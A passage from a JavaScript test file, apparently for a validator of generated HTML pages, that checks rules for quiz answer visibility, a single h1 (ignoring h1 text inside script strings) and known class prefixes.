<section class="section quiz" data-quiz><h2>q</h2><ol><li>一?</li><li>二?</li></ol><button type="button" data-quiz-toggle>x</button><div data-quiz-answers hidden style="display:block"><p>a</p></div></section>`);
  assert.equal(gate(run(page), "self-test").status, "fail");
});
test("red7: h1 count ignores script string literals; simple class not sim-prefixed", () => {
  const a = run(goodPage.replace("<h1 class=\"t-2\">标题</h1>", "<div class=\"t-2\">标题</div>").replace("const ok = 1;", 'const ok = 1; const s = "<h1>x</h1>";'));
  assert.equal(gate(a, "single-h1").status, "fail", "真 h1 为 0(script 字符串不算)须挂");
  const b = run(goodPage.replace("<h3>小节</h3>", '<h3 class="simple">小节</h3>'));
  assert.equal(gate(b, "classes-known").status, "pass", "simple 不是 sim 前缀");
});
